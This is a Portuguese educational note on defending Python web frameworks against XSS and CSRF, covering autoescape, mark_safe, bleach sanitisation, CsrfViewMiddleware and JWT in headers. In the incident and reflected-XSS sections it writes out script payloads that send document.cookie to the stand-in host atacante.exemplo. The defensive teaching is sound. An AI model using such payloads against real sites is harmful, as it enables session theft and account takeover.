---
title: "XSS e CSRF nos frameworks Python"
created: 2026-07-11
type: concept
fase: adepto
status: complete
publish: true
tags:
  - python
  - seguranca
  - owasp
  - xss
  - csrf
  - django
  - fastapi
  - flask
aliases:
  - "Cross-Site Scripting"
  - "Cross-Site Request Forgery"
  - "autoescape"
  - "mark_safe"
  - "csrf_token"
  - "CsrfViewMiddleware"
---

# XSS e CSRF nos frameworks Python

> [!abstract] TL;DR
> **XSS** e **CSRF** são as duas vulnerabilidades clássicas de aplicação web que exploram, cada uma à sua maneira, a confiança que o navegador deposita em conteúdo e em cookies. **XSS** injeta script no HTML que o navegador de outra pessoa renderiza — a defesa de fábrica dos template engines Python (Jinja2, Django Templates) é **autoescape automático**: toda variável interpolada é escapada por padrão, e só vira HTML executável se alguém explicitamente desligar essa proteção com `|safe` (Jinja2) ou `mark_safe()`/`{% autoescape off %}` (Django) — quase sempre para "permitir formatação", quase sempre sem sanitizar o que entra. **CSRF** é diferente: explora o fato de o navegador anexar cookies automaticamente a qualquer requisição, mesmo vinda de outro site — o Django resolve isso com `CsrfViewMiddleware` mais um token sincronizado (`{% csrf_token %}`). O ponto central desta nota é o motivo estrutural pelo qual **APIs que autenticam via JWT no header `Authorization` são estruturalmente imunes a CSRF**, sem precisar de token algum: o navegador não anexa headers customizados automaticamente entre sites — só cookies. Onde não há cookie de sessão, não há CSRF para proteger.

> [!question]- Perguntas que esta nota responde
> - Por que um campo de "bio" com formatação HTML é, por padrão, uma porta de entrada pra roubar sessão de quem visualiza o perfil?
> - `|safe` e `mark_safe()` fazem a mesma coisa — quando cada um é realmente necessário?
> - Minha API FastAPI/DRF, que só devolve JSON, precisa se preocupar com XSS?
> - Por que uma API com JWT no header não precisa de `csrf_token`, e uma API com JWT em cookie precisa?
> - Quando devo manter proteção CSRF mesmo numa API "moderna"?

## O incidente que abre esta nota

Um sistema de rede social interna — perfis de funcionário, bio, foto, cargo — está em produção há dois anos, construído em Django. O time de produto pede um recurso pequeno: permitir que o campo "bio" do perfil aceite **negrito e links**, porque usuários reclamam que só conseguem escrever texto corrido. Um desenvolvedor implementa a versão mais rápida possível: em vez de adicionar um editor de rich text com sanitização, ele deixa o campo aceitar HTML cru, digitado à mão pelo usuário (`<b>trabalho com dados</b>`), e no template que renderiza o perfil, marca a variável como segura para não escapar:

```django
{# perfil.html — ANTES do incidente #}
<div class="bio">
    {{ usuario.bio|safe }}
</div>
```

Funciona perfeitamente nos testes: quem escreve `<b>negrito</b>` na bio vê negrito de verdade na página. O recurso vai pra produção sem revisão de segurança — "é só um campo de texto".

Três semanas depois, um funcionário mal-intencionado (ou uma conta comprometida) edita a própria bio para conter isto:

```html
<script>
fetch('https://atacante.exemplo/roubo?c=' + document.cookie);
</script>
```

A partir desse momento, **todo colega que visualiza o perfil desse funcionário** executa esse script no próprio navegador — porque o Django, seguindo a instrução explícita de `|safe`, devolveu o HTML sem escapar, e o navegador de quem visita a página não tem como distinguir "script legítimo do site" de "script injetado por outro usuário". Se o cookie de sessão não tiver a flag `HttpOnly` (ver [[03-Dominios/Engenharia/Auth e Identidade/1 - Fundamentos de identidade/02 - Sessões e cookies — auth stateful|nota de Sessões e cookies]]), o script rouba o cookie de sessão de cada colega que visita o perfil e manda para um servidor externo — o atacante agora pode personificar qualquer um desses colegas sem nunca ter visto a senha deles.

> [!bug] O que está quebrado, em uma frase
> Um campo de entrada de usuário virou HTML executável, direto, sem nenhuma sanitização — porque `|safe` desligou a única proteção que o Django dava de graça, e ninguém substituiu essa proteção por outra.

Esse é o exemplo canônico de **XSS armazenado** (*stored XSS*): o payload malicioso fica salvo no banco de dados e é servido para qualquer visitante futuro, sem precisar de nenhuma ação extra do atacante depois da injeção inicial. É o tipo mais perigoso das duas variantes de XSS, e é onde esta nota começa.

## XSS: as duas formas de injetar script no navegador de outra pessoa

**Cross-Site Scripting** é a classe de vulnerabilidade em que um atacante consegue fazer o navegador da vítima executar JavaScript que ele controla, no contexto de origem do site confiável — o script roda como se fosse parte legítima da página, com acesso ao DOM, aos cookies não protegidos por `HttpOnly`, ao `localStorage`, e à capacidade de fazer requisições autenticadas em nome da vítima. O [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) distingue duas famílias principais — esta nota cobre as duas que aparecem no dia a dia de uma API/aplicação Python server-rendered; a terceira variante (**DOM-based XSS**, onde o próprio JavaScript do frontend manipula o DOM de forma insegura, sem o servidor nunca ver o payload) é majoritariamente um problema de frontend e só é mencionada brevemente mais adiante.

### XSS refletido: o payload vive na requisição, não no banco

No **XSS refletido** (*reflected XSS*), o script malicioso não é armazenado em lugar nenhum — ele viaja dentro da própria requisição (tipicamente um parâmetro de query string) e é imediatamente refletido de volta na resposta HTML, sem passar por persistência. O ataque depende de convencer a vítima a clicar num link malicioso especialmente construído:

```
https://loja.exemplo/busca?termo=<script>fetch('https://atacante.exemplo/roubo?c='+document.cookie)</script>
```

Se o template que renderiza a página de resultados de busca interpolar `termo` sem escapar:

```django
{# busca.html — vulnerável se autoescape estiver desligado #}
<p>Resultados para: {{ termo|safe }}</p>
```

qualquer pessoa que clique nesse link específico executa o script — mas só essa pessoa, e só naquele clique. Diferente do stored XSS, não há persistência: o ataque exige engenharia social (um link em e-mail, uma mensagem, um encurtador de URL disfarçando o payload) a cada vítima.

### XSS armazenado: o payload vive no banco, ataca qualquer visitante

Já demonstrado no incidente de abertura: o **XSS armazenado** (*stored XSS*) persiste o payload em algum lugar que o servidor depois renderiza para outros usuários — um comentário, uma bio, o nome de um produto num marketplace, uma avaliação. É estruturalmente mais grave que o refletido por dois motivos: não exige engenharia social por vítima (basta visitar uma página que já existe) e escala automaticamente — um único payload injetado ataca todo mundo que visualizar aquele conteúdo, indefinidamente, até alguém limpar o banco.

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#D0021B", "primaryBorderColor": "#8B0000", "lineColor": "#D0021B"}}}%%
sequenceDiagram
    participant A as Atacante
    participant S as Servidor (Django)
    participant DB as Banco de dados
    participant V as Vítima (navegador)

    A->>S: POST /perfil/bio<br/>bio = "<script>roubo de cookie</script>"
    S->>DB: salva bio sem sanitizar
    Note over DB: payload persistido, esperando<br/>a próxima vítima visitar

    V->>S: GET /perfil/atacante
    S->>DB: busca bio
    DB-->>S: "<script>roubo de cookie</script>"
    S-->>V: HTML com {{ bio|safe }} — script incluído sem escapar
    Note over V: navegador executa o script<br/>como se fosse parte legítima da página
    V->>A: fetch(atacante.exemplo/roubo?c=document.cookie)
    Note over A: atacante recebe o cookie de sessão<br/>de cada visitante do perfil
```

## Autoescape: a proteção "de graça" que os template engines já dão

O fato mais importante desta nota, para quem trabalha com Django Templates ou Jinja2 no dia a dia, é que **nenhum dos dois exige esforço extra para se proteger de XSS via interpolação de variável** — a proteção já vem ligada por padrão.

### Jinja2

Jinja2 escapa automaticamente qualquer variável interpolada com `{{ }}` quando o **autoescape** está ativo — e o Flask, ao integrar o Jinja2, já ativa autoescape por padrão para templates com extensão `.html`, `.htm`, `.xml` e `.xhtml`:

```jinja2
{# perfil.html — SEGURO por padrão #}
<div class="bio">
    {{ usuario.bio }}
</div>
```

Se `usuario.bio` for `<script>alert(1)</script>`, o Jinja2 devolve, no HTML final:

```html
<div class="bio">
    &lt;script&gt;alert(1)&lt;/script&gt;
</div>
```

O navegador renderiza esse texto **literalmente** como a string `<script>alert(1)</script>` visível na tela — não como uma tag executável. Nenhum script roda. É exatamente esse comportamento que o `|safe` do incidente de abertura desligou.

### Django Templates

O motor de templates nativo do Django funciona sob o mesmo princípio: autoescape é o padrão, herdado do bloco `{% autoescape on %}` implícito em todo template, desde a versão 1.0 do framework. A mesma variável interpolada com `{{ usuario.bio }}` já sai escapada — `<`, `>`, `&`, `"` e `'` viram suas entidades HTML correspondentes.

> [!tip] Autoescape é "seguro por padrão" — o oposto de PHP clássico ou templates sem esse recurso
> A escolha de design de Jinja2 e Django Templates — escapar por padrão, exigir opt-in explícito para não escapar — é o que a literatura de segurança chama de **secure by default**: o caminho mais fácil (não fazer nada) é também o caminho seguro. Isso contrasta com engines mais antigas ou com concatenação manual de string HTML, onde o caminho mais fácil é justamente o inseguro (interpolar direto na string) e a proteção exige lembrar de chamar uma função de escape manualmente, toda vez, em todo lugar — um modelo que falha assim que alguém esquece uma vez.

### Como a proteção se desliga — e por que isso quase sempre é um erro

As duas formas de desligar autoescape existem por um motivo legítimo (renderizar HTML que o próprio sistema gerou e confia, como um trecho de Markdown já convertido por uma lib confiável), mas na prática são usadas, com mais frequência, para o motivo errado — "deixar o usuário formatar o próprio texto" sem sanitização nenhuma.

**Jinja2 — filtro `|safe`:**

```jinja2
{# marca a string como segura para não escapar — USE COM CUIDADO #}
{{ usuario.bio|safe }}
```

**Django Templates — `mark_safe()` (no código Python) ou `{% autoescape off %}` (no template):**

```python
# views.py — desliga a proteção na origem do dado, ANTES do template
from django.utils.safestring import mark_safe

def contexto_perfil(usuario):
    return {"bio": mark_safe(usuario.bio)}   # tudo que passar por aqui não é escapado no template
```

```django
{# perfil.html — desliga a proteção no bloco inteiro do template #}
{% autoescape off %}
    <div class="bio">{{ usuario.bio }}</div>
{% endautoescape %}
```

Os dois mecanismos do Django (`mark_safe()` e `{% autoescape off %}`) têm o mesmo efeito final, mas escopos diferentes: `mark_safe()` marca **um valor específico** como seguro, permanentemente, em qualquer lugar que ele for usado depois — inclusive se reaproveitado em outro template sem ninguém perceber que já passou por `mark_safe()`. `{% autoescape off %}` desliga a proteção para **um bloco inteiro** do template, então qualquer variável interpolada dentro dele — inclusive uma que ninguém pretendia deixar insegura — perde o escape.

> [!warning] `|safe`/`mark_safe()` não sanitizam nada — só desligam a proteção
> O nome `mark_safe()` é enganoso para quem lê rápido: a função não torna o conteúdo seguro, ela **declara** que o desenvolvedor já garantiu, por algum outro meio, que aquele conteúdo é seguro — e o Django confia nessa declaração sem verificar. Se o valor passado veio direto de um campo de formulário preenchido por um usuário, sem nenhuma sanitização no meio do caminho, `mark_safe()` está mentindo pro framework, não protegendo o sistema. O mesmo vale para `|safe` no Jinja2: é um filtro de "confie em mim", não um filtro de limpeza.

### A correção certa: sanitizar, não apenas confiar

Quando o requisito de produto genuinamente exige HTML gerado pelo usuário — um editor de rich text, markdown renderizado, formatação básica — a resposta correta não é desligar o autoescape, é **sanitizar o HTML antes de marcá-lo como seguro**, com uma allowlist explícita de tags e atributos permitidos. A biblioteca mais usada no ecossistema Python para isso é o [`bleach`](https://github.com/mozilla/bleach) (originalmente da Mozilla, hoje mantido pela comunidade):

```python
import bleach

TAGS_PERMITIDAS = ["b", "i", "u", "a", "p", "br"]
ATRIBUTOS_PERMITIDOS = {"a": ["href", "title"]}

def sanitizar_bio(html_bruto: str) -> str:
    return bleach.clean(
        html_bruto,
        tags=TAGS_PERMITIDAS,
        attributes=ATRIBUTOS_PERMITIDOS,
        strip=True,   # remove tags não permitidas, em vez de escapá-las visíveis
    )
```

```python
# views.py — a correção do incidente de abertura
from django.utils.safestring import mark_safe
import bleach

def contexto_perfil(usuario):
    bio_limpa = bleach.clean(usuario.bio, tags=TAGS_PERMITIDAS, attributes=ATRIBUTOS_PERMITIDOS, strip=True)
    return {"bio": mark_safe(bio_limpa)}   # agora seguro: só chegou aqui o que passou pelo allowlist
```

Com essa correção, `<script>...</script>` na bio é **removido** por `bleach.clean()` antes mesmo de chegar no template — `mark_safe()` continua sendo usado (o template ainda precisa não escapar o HTML permitido, como `<b>`), mas agora ele marca como seguro um valor que passou por um filtro de verdade, não um valor cru direto do usuário.

> [!question]- Por que não sanitizar na entrada (ao salvar) em vez de na saída (ao renderizar)?
> As duas abordagens existem e a recomendação varia por caso. Sanitizar **na entrada** (antes de salvar no banco) tem a vantagem de o banco nunca guardar payload malicioso — útil se o mesmo dado for consumido por múltiplos canais (API JSON, export, outro template) que poderiam esquecer de sanitizar na saída. A desvantagem é perder o HTML original: se a política de tags permitidas mudar depois, o dado já foi destrutivamente limpo e não há como recuperar o que foi removido. Sanitizar **na saída** (a cada renderização, como no exemplo acima) preserva o dado original no banco e permite mudar a política de sanitização sem reprocessar tudo, mas exige disciplina de nunca esquecer de sanitizar em nenhum dos pontos de renderização. O [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) recomenda contextual output encoding como a defesa primária — ou seja, priorizar a sanitização/escape no ponto de saída — com validação de entrada como camada complementar, não substituta.

## XSS em APIs JSON: por que é raro, mas não impossível

Uma API construída com FastAPI ou Django REST Framework, que só devolve `application/json` e nunca renderiza HTML, está estruturalmente numa posição bem mais segura contra XSS do que uma aplicação que gera páginas — mas "mais segura" não é "imune", e vale entender o porquê de cada metade dessa frase.

### Por que é raro

O navegador só interpreta uma resposta como HTML executável se o `Content-Type` da resposta for algo como `text/html` **e** o conteúdo for de fato consumido nesse contexto — abrir diretamente no navegador, ou ser injetado no DOM por outro código. Uma resposta JSON legítima, com `Content-Type: application/json`, não é interpretada como HTML pelo navegador em nenhuma circunstância normal: mesmo que o corpo da resposta contenha literalmente a string `<script>alert(1)</script>` dentro de um campo, o navegador não executa nada — ele só vê um valor de string dentro de uma estrutura de dados. FastAPI e DRF, por padrão, escapam corretamente aspas e caracteres especiais na serialização JSON (via `json.dumps`/serializadores do Pydantic e do DRF), então nem mesmo o JSON em si fica malformado.

```mermaid
graph LR
    A["Payload malicioso salvo:<br/>'&lt;script&gt;roubo&lt;/script&gt;'"] --> B{"Como a resposta<br/>é servida?"}
    B -->|"Content-Type: application/json<br/>(FastAPI/DRF puro)"| C["Navegador trata como STRING<br/>dentro de um objeto — não executa"]
    B -->|"Content-Type: text/html<br/>(template server-rendered)"| D["Navegador PODE executar,<br/>se não estiver escapado"]
    style C fill:#2d7a4a,color:#fff
    style D fill:#D0021B,color:#fff
```

### Onde o risco reaparece — e de quem é a responsabilidade

O risco não desaparece por completo, ele só **muda de camada**: se o payload malicioso sobrevive intacto num campo JSON e o **frontend** (React, Vue, qualquer SPA) decidir renderizar esse campo diretamente como HTML — o caso mais comum é `dangerouslySetInnerHTML` no React, ou `v-html` no Vue — sem sanitizar antes, o XSS acontece ali, no cliente, não na API. A API fez exatamente o que se espera dela: devolveu o dado fielmente, como string, sem interpretar. Quem decidiu tratar aquela string como HTML executável foi o código do frontend.

> [!question]- Se o XSS acontece no frontend, por que a API deveria se importar?
> Porque a API é, na prática, a única camada que sabe de onde o dado **veio** — se é conteúdo gerado por outro usuário (a bio de alguém, um comentário) ou conteúdo gerado internamente pelo próprio sistema (um nome de categoria fixo, cadastrado por um admin confiável). Um princípio defensável, mesmo numa API JSON pura: sanitizar (com `bleach`, por exemplo) qualquer campo de texto livre que aceita input de usuário e que o time **sabe** que algum frontend consumidor vai eventualmente renderizar como rich text — não porque a API "precisa" tecnicamente, já que JSON não executa, mas porque um frontend descuidado (o próprio time, ou um terceiro consumindo a API pública) é um risco real, e a API é o único ponto de controle centralizado sobre o que aquele campo pode conter. Esse raciocínio é o mesmo por trás de defesa em profundidade: cada camada se protege mesmo confiando que a camada seguinte também deveria se proteger.

Vale nomear, por completude, que existe uma variante ainda mais rara de XSS em APIs JSON: **content-type sniffing**. Navegadores antigos, ou configurações de servidor incorretas que servem JSON sem declarar `Content-Type` explicitamente (ou com `Content-Type: text/plain`), podiam ser induzidos a "adivinhar" que o conteúdo era HTML e renderizá-lo — um vetor que a maioria dos navegadores modernos fecha com o header `X-Content-Type-Options: nosniff`, que instrui o navegador a nunca reinterpretar o `Content-Type` declarado. FastAPI e DRF já declaram `Content-Type: application/json` corretamente por padrão; adicionar `X-Content-Type-Options: nosniff` (via middleware) é uma camada extra de defesa barata contra esse vetor residual.

## CSRF: o ataque contra sessões autenticadas por cookie

**Cross-Site Request Forgery** é uma vulnerabilidade estruturalmente diferente de XSS: não depende de injetar script em lugar nenhum — depende só de um comportamento padrão do navegador, que anexa cookies automaticamente a qualquer requisição para o domínio dono do cookie, **mesmo que a requisição tenha sido disparada por outro site**. A [nota de Sessões e cookies](../../Engenharia/Auth%20e%20Identidade/1%20-%20Fundamentos%20de%20identidade/02%20-%20Sessões%20e%20cookies%20—%20auth%20stateful.md) já cobriu esse mecanismo em profundidade do lado da sessão — esta nota revisita o ataque especificamente pela lente da defesa built-in do Django e do contraste com JWT.

O ataque clássico, num sistema Django server-rendered autenticado por sessão:

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#D0021B", "primaryBorderColor": "#8B0000", "lineColor": "#D0021B"}}}%%
sequenceDiagram
    participant V as Vítima (logada em banco.exemplo)
    participant M as site-malicioso.com
    participant B as banco.exemplo (Django)

    Note over V,B: Vítima já tem cookie de sessão válido em banco.exemplo
    V->>M: visita site-malicioso.com (link em e-mail, anúncio)
    M-->>V: <form action="banco.exemplo/transferir" method="POST" auto-submit>
    V->>B: POST /transferir (Cookie: sessionid=... anexado pelo navegador automaticamente)
    Note over B: sem CsrfViewMiddleware, o servidor só vê<br/>um cookie de sessão válido — não sabe que<br/>o request partiu de outro site
    B-->>V: transferência executada, sem a vítima ter clicado em nada no próprio banco
```

O detalhe que torna CSRF perigoso mesmo sem nenhum bug de XSS envolvido: o atacante **nunca precisa ler** o cookie da vítima — só precisa que o navegador dela **envie** o cookie, o que acontece de forma automática e invisível ao usuário.

## A proteção built-in do Django: `CsrfViewMiddleware` e `{% csrf_token %}`

O Django, desde suas primeiras versões, resolve CSRF com o **Synchronizer Token Pattern**: um token secreto, gerado por sessão, que precisa acompanhar toda requisição de mutação (`POST`, `PUT`, `PATCH`, `DELETE`) — se o token não vier, ou não bater com o esperado, o middleware rejeita a requisição antes mesmo dela chegar na view.

### Como o mecanismo se encaixa

```python
# settings.py — já vem habilitado por padrão em qualquer projeto novo do Django
MIDDLEWARE = [
    ...
    "django.middleware.csrf.CsrfViewMiddleware",
    ...
]
```

No template, qualquer formulário HTML que faça `POST` precisa incluir a tag `{% csrf_token %}`, que o Django expande num campo hidden com o token da sessão atual:

```django
{# transferir.html #}
<form method="post" action="/transferir/">
    {% csrf_token %}
    <input type="text" name="valor">
    <button type="submit">Transferir</button>
</form>
```

O HTML renderizado inclui o token embutido:

```html
<form method="post" action="/transferir/">
    <input type="hidden" name="csrfmiddlewaretoken" value="k3J9x...token-secreto...">
    <input type="text" name="valor">
    <button type="submit">Transferir</button>
</form>
```

Quando esse formulário é submetido, o Django compara o `csrfmiddlewaretoken` recebido com o valor esperado para aquela sessão — se baterem, a requisição prossegue; se não baterem (ou faltarem), o `CsrfViewMiddleware` devolve `403 Forbidden` antes de qualquer lógica de negócio rodar.

Para requisições disparadas por JavaScript (`fetch`/`XMLHttpRequest`, comuns num frontend SPA que ainda autentica via cookie de sessão Django), o token precisa ser enviado num header customizado, tipicamente `X-CSRFToken`, lido do próprio cookie `csrftoken` que o Django também expõe (não-`HttpOnly`, de propósito, justamente para o JavaScript conseguir lê-lo e reenviá-lo):

```javascript
// frontend consumindo uma view Django autenticada por sessão
function getCookie(nome) {
    return document.cookie.split('; ').find(c => c.startsWith(nome + '='))?.split('=')[1];
}

fetch('/transferir/', {
    method: 'POST',
    headers: { 'X-CSRFToken': getCookie('csrftoken'), 'Content-Type': 'application/json' },
    body: JSON.stringify({ valor: 100 }),
});
```

Esse padrão — token no cookie, reenviado explicitamente no header — é exatamente o **double-submit cookie**, já descrito na nota de Sessões e cookies: o site malicioso consegue fazer o navegador **enviar** o cookie `csrftoken`, mas não consegue **ler** o valor dele para replicá-lo no header `X-CSRFToken`, porque isso violaria a política de mesma origem do navegador.

> [!warning] Desativar `CsrfViewMiddleware` (ou usar `@csrf_exempt`) sem substituir por outra proteção
> **O que acontece:** um endpoint novo — geralmente um webhook de terceiro, ou uma API JSON adicionada tardiamente a um projeto Django tradicional — recebe o decorator `@csrf_exempt` "porque o cliente não é um formulário HTML e não tem como mandar o token", sem verificar se esse endpoint ainda autentica via cookie de sessão. **Por quê:** se o endpoint isento continuar aceitando o cookie de sessão do usuário como prova de identidade, ele reabre exatamente a porta que o `CsrfViewMiddleware` fechava — um site malicioso consegue disparar esse endpoint específico sem token nenhum. **Como evitar:** a regra estrutural (a mesma nomeada na nota de Sessões e cookies) é: qualquer endpoint que aceita cookie de sessão para autenticar uma mutação de estado precisa de proteção CSRF, sem exceção. `@csrf_exempt` só é seguro em endpoints que autenticam por outro mecanismo — API key validada manualmente, assinatura HMAC do payload (padrão comum em webhooks), ou — o caso central desta nota — token no header `Authorization`.

## Por que uma API JWT-em-header é estruturalmente imune a CSRF

Esta é a peça central da nota, e o raciocínio vale entender em profundidade, não só memorizar a conclusão.

O mecanismo interno do JWT — como ele é assinado, o que vai nos claims, como o resource server valida a assinatura — já foi coberto na nota [[03-Dominios/Engenharia/Auth e Identidade/1 - Fundamentos de identidade/03 - JWT e a família de tokens|JWT e a família de tokens]] e não é repetido aqui. O único fato dessa nota que importa para o argumento de CSRF é este: numa API stateless típica (FastAPI com `OAuth2PasswordBearer`, DRF com `SimpleJWT`), o cliente manda o token **no header HTTP**, não em cookie:

```http
GET /pedidos HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

### O mecanismo da imunidade: o navegador não anexa headers customizados entre sites

CSRF funciona porque o navegador tem uma regra específica, e só uma: **anexar automaticamente qualquer cookie pertencente ao domínio de destino**, em qualquer requisição para esse domínio — não importa de onde a requisição partiu. Essa regra **não existe** para headers HTTP customizados. Um site malicioso consegue fazer o navegador da vítima disparar um `POST` para `banco.exemplo` (via `<form>` auto-submit, como no diagrama anterior), e o navegador vai anexar o cookie de sessão de `banco.exemplo` sozinho — mas esse mesmo site malicioso **não tem como fazer o navegador incluir** um header `Authorization: Bearer <token>` nessa requisição, porque:

1. O site malicioso não tem acesso ao valor do token — ele normalmente vive em memória JavaScript ou `localStorage` do domínio legítimo, inacessível a partir de outra origem pela política de mesma origem do navegador.
2. Mesmo que o atacante tentasse adivinhar ou reutilizar um token antigo, um `<form>` HTML — o vetor clássico de CSRF — não tem como definir headers HTTP arbitrários. Só cookies, que o navegador gerencia por conta própria, viajam "de graça" com qualquer requisição disparada por HTML puro.
3. Uma requisição `fetch()`/`XMLHttpRequest` disparada por JavaScript de outra origem **poderia**, em teoria, tentar setar um header `Authorization` — mas o CORS entra em ação: o navegador bloqueia a leitura da resposta (e, para métodos não-simples ou headers customizados, bloqueia até o envio da requisição sem um preflight `OPTIONS` bem-sucedido) a menos que o servidor explicitamente autorize aquela origem via `Access-Control-Allow-Origin`. Uma API bem configurada nunca autoriza `site-malicioso.com` nessa lista.

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9", "primaryBorderColor": "#2E5C8A", "lineColor": "#4A90D9"}}}%%
sequenceDiagram
    participant V as Vítima (JWT guardado no frontend legítimo)
    participant M as site-malicioso.com
    participant A as api.exemplo (JWT no header)

    Note over V,A: Vítima tem um JWT válido, mas ele vive em memória<br/>JS do domínio legítimo — não em cookie
    V->>M: visita site-malicioso.com
    M-->>V: <form action="api.exemplo/transferir" method="POST" auto-submit>
    V->>A: POST /transferir (SEM header Authorization —<br/>um <form> HTML não consegue definir headers customizados)
    A-->>V: 401 Unauthorized — nenhuma credencial anexada
    Note over A: ataque falha estruturalmente:<br/>não existe token pra anexar automaticamente
```

Compare o desfecho desse diagrama com o do ataque clássico contra sessão: lá, o `POST` malicioso **chega completo**, com o cookie de sessão válido anexado pelo navegador — o servidor não tem como distinguir esse request de um request legítimo só olhando pra credencial. Aqui, o `POST` malicioso **chega vazio de credencial** — não existe mecanismo do navegador que replique um header `Authorization` automaticamente, então a API rejeita antes de qualquer lógica de negócio rodar.

> [!tip] A imunidade não é "o JWT é mais seguro" — é "o transporte é diferente"
> É tentador (e impreciso) concluir "JWT resolve CSRF, cookie não". A comparação certa não é JWT vs. cookie como formato de token — é **onde o token viaja**. Um JWT guardado num cookie (padrão às vezes usado justamente para ganhar a proteção `HttpOnly` contra roubo via XSS) volta a ser vulnerável a CSRF, pela mesma razão que sessão é: o navegador o anexa automaticamente. E um session ID opaco, se por algum desenho exótico fosse exigido só via header customizado (não é o padrão de nenhum framework mainstream, mas ilustra o ponto), ganharia a mesma imunidade estrutural. **A defesa vem do transporte via header, não da tecnologia do token.**

> [!question]- Isso significa que localStorage é o lugar certo pra guardar o JWT, já que assim ele nunca vira cookie?
> Não — trocar um risco por outro não é uma vitória. Guardar o JWT em `localStorage` (ou em variável JavaScript em memória) fecha CSRF pelo mecanismo descrito nesta nota, mas reabre a porta pra roubo via **XSS**: qualquer script injetado na página (a primeira metade desta nota) tem acesso irrestrito a `localStorage`, e rouba o token inteiro com uma linha de código, sem precisar de nenhum truque de cookie. Não existe storage "perfeito" no navegador — cookie `HttpOnly` protege de XSS mas abre CSRF; `localStorage`/memória protege de CSRF mas abre XSS. A escolha correta depende de qual das duas ameaças é mais relevante pro sistema, e frequentemente a resposta madura é: token de vida curta (minutos), rotação frequente via refresh token guardado num cookie `HttpOnly`+`Secure`+`SameSite=Strict` só usado no endpoint de refresh — limitando a janela de exposição de qualquer uma das duas classes de ataque. Esse desenho de refresh token já foi coberto em [[03-Dominios/Engenharia/Auth e Identidade/1 - Fundamentos de identidade/03 - JWT e a família de tokens|JWT e a família de tokens]] e não é repetido aqui.

## Armadilhas comuns

> [!warning] Achar que "API JSON" já significa "imune a CSRF" sem checar onde o token vive
> **O que acontece:** um time migra de sessão Django para "autenticação por token" para simplificar a arquitetura, mas guarda esse token num cookie — por conveniência (o navegador cuida de enviar sozinho, sem o frontend precisar gerenciar `localStorage`) — sem perceber que reintroduziu exatamente a vulnerabilidade que motivou a migração. **Por quê:** a crença de que "token = imune a CSRF" ignora o mecanismo real: a imunidade vem do transporte via header, não do formato do token. Um JWT em cookie tem exatamente a mesma superfície de CSRF que um session ID em cookie. **Como evitar:** se o token precisa viver em cookie por algum motivo de arquitetura, tratar esse cookie exatamente como um cookie de sessão tradicional — `SameSite`, e quando necessário, token anti-CSRF explícito (ver nota de Sessões e cookies). Se o objetivo é imunidade estrutural a CSRF, o token precisa viajar no header `Authorization`, não em cookie.

> [!warning] `|safe`/`mark_safe()` aplicado a campo de input de usuário sem sanitização
> **O que acontece:** o mesmo padrão do incidente de abertura — um campo de texto livre marcado como seguro pra "permitir formatação", sem nenhuma etapa de limpeza no meio do caminho. **Por quê:** `mark_safe()`/`|safe` são declarações de confiança, não filtros — o Django e o Jinja2 confiam cegamente que o desenvolvedor já garantiu a segurança daquele valor. **Como evitar:** todo campo que aceita HTML de usuário e precisa ser marcado como seguro passa primeiro por um sanitizador com allowlist explícita (`bleach.clean()`), nunca direto do banco pro `mark_safe()`.

> [!warning] `@csrf_exempt` num endpoint que ainda aceita cookie de sessão
> **O que acontece:** um endpoint recebe `@csrf_exempt` só porque é consumido por JavaScript ou por um terceiro, sem verificar se ele ainda usa `SessionAuthentication`/cookie como mecanismo de autenticação. **Por quê:** `@csrf_exempt` remove a única camada de defesa que impedia um site malicioso de acionar esse endpoint especificamente, usando o cookie de sessão da vítima. **Como evitar:** `@csrf_exempt` só é seguro combinado com um mecanismo de autenticação que **não** seja cookie automático — token no header, HMAC de webhook, API key validada explicitamente.

> [!warning] Content-Type errado numa resposta que deveria ser JSON puro
> **O que acontece:** um endpoint devolve dado gerado dinamicamente com `Content-Type: text/plain` ou sem header explícito, em vez de `application/json`, geralmente por configuração default de um servidor ou proxy mal ajustado. **Por quê:** em navegadores/configurações antigas, isso reabre uma fresta residual de content-type sniffing, onde o navegador tenta "adivinhar" o tipo do conteúdo e, em cenários raros, pode interpretar como HTML. **Como evitar:** declarar `Content-Type: application/json` explicitamente (FastAPI e DRF já fazem isso por padrão) e adicionar `X-Content-Type-Options: nosniff` via middleware como camada extra, especialmente em APIs que servem conteúdo gerado por usuário.

## Tabela de decisão: quando proteção CSRF é necessária vs. redundante

| Cenário de autenticação | Proteção CSRF necessária? | Por quê |
|---|---|---|
| Django server-rendered, `SessionAuthentication`, cookie de sessão | **Sim, obrigatória** | Navegador anexa o cookie automaticamente em qualquer requisição cross-site; sem token, o servidor não distingue request legítimo de forjado. |
| DRF/FastAPI consumido por SPA same-domain, token JWT em cookie `HttpOnly` | **Sim, obrigatória** | O token viaja como cookie — a mesma superfície de CSRF de uma sessão tradicional, independente do formato do token. |
| FastAPI/DRF com JWT no header `Authorization: Bearer` (`localStorage`/memória no frontend) | **Não, estruturalmente redundante** | Nenhum mecanismo do navegador replica um header customizado numa requisição cross-site — não há credencial pra o ataque anexar. |
| API mobile nativa (app iOS/Android) com token no header | **Não** | Não existe navegador nem cookie no meio — o conceito de "cross-site" via `<form>`/cookie automático nem se aplica. |
| Webhook de terceiro (Stripe, GitHub) validado por assinatura HMAC do payload | **Não** | Autenticação não depende de cookie nem de sessão do usuário — a assinatura HMAC já garante que a requisição veio de quem detém o segredo compartilhado. |
| Endpoint público, sem autenticação (ex.: cadastro de newsletter) | **Depende** | Sem sessão nem token de usuário autenticado envolvido, CSRF clássico não se aplica — mas vale avaliar abuso/spam por outros meios (rate limiting, captcha), fora do escopo desta nota. |

> [!question]- E se a API usa cookie só pra refresh token, mas access token vai no header — preciso de CSRF em algum lugar?
